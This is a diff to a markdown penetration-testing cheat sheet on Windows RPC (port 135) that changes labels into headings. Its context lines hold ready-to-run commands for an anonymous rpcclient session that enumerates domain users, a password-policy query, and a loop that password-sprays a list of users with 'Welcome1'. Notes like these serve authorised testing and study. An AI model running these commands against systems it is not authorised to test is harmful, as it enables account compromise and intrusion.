@@ -4,20 +4,20 @@
 - RPC Endpoint Mapper listens on **port 135**, and then assigns dynamic ports for communication.
 - Often used in Windows for services like **Active Directory, WMI, and DCOM**.
 
-Anonymous Login:
+#### Anonymous Login
 
 ```bash
 rpcclient -U'%' 10.10.110.17
 enumdomusers
 ```
 
-Obtain password policy:
+#### Obtain password policy:
 
 ```bash
 querydominfo
 ```
 
-Password Spray with a single password:
+#### Password Spray with a Single Password:
 
 ```bash
 for u in $(cat users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
